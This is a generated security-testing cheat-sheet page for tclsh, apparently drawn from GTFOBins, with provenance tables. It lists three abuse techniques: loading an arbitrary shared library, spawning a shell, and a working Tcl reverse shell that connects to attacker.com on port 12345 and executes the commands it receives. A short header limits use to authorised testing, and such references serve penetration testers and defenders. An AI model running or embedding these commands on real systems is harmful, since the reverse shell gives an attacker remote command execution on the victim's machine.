---
parsed_by: focuslocust
source: commands
type: generated
---
# tclsh Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## tclsh

Tool page: [tclsh](../../tools/linux/tclsh.md)

### library-load

```text
tclsh
load /path/to/lib.so x
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/tclsh` |
| Evidence | Function example preserved from source parser. |

### reverse-shell

```text
tclsh
set s [socket attacker.com 12345];while 1 { puts -nonewline $s "> ";flush $s;gets $s c;set e "exec $c";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/tclsh` |
| Evidence | Function example preserved from source parser. |

### shell

```text
tclsh
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/tclsh` |
| Evidence | Function example preserved from source parser. |
